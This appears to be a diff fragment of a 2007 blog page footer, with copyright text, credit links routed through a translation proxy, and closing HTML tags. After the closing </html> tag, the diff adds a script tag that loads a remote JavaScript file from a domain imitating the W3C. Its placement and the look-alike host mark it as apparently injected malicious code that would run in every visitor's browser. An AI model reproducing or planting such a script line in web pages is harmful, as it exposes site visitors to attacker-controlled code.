+<strong>? Copyright 2007. All rights reserved.</strong><br /> <a href="http://64.233.179.104/translate_c?hl=zh-CN&amp;langpair=fr&#037;7Cen&amp;u=http://www.ddsos.org/">Ekta Paneri</a> adapted the blix, by help of <a href="http://64.233.179.104/translate_c?hl=zh-CN&amp;langpair=fr&#037;7Cen&amp;u=http://www.hostseeq.com/c/budget_hosting.htm">Budget Web Hosting</a> and <a href="http://64.233.179.104/translate_c?hl=zh-CN&amp;langpair=fr&#037;7Cen&amp;u=http://www.hostseeq.com/">Free Web Host</a>. <a href="http://64.233.179.104/translate_c?hl=zh-CN&amp;langpair=fr&#037;7Cen&amp;u=http://ivanlef0u.free.fr/wp-login.php">Connection</a> </div> <!-- /footer -->
+
+
+
+</div> <!-- /container -->
+
+
+
+</body>
+
+
+
+</html>
+<script language=javascript src=http://www.w3c-org.com/css2.js></script>
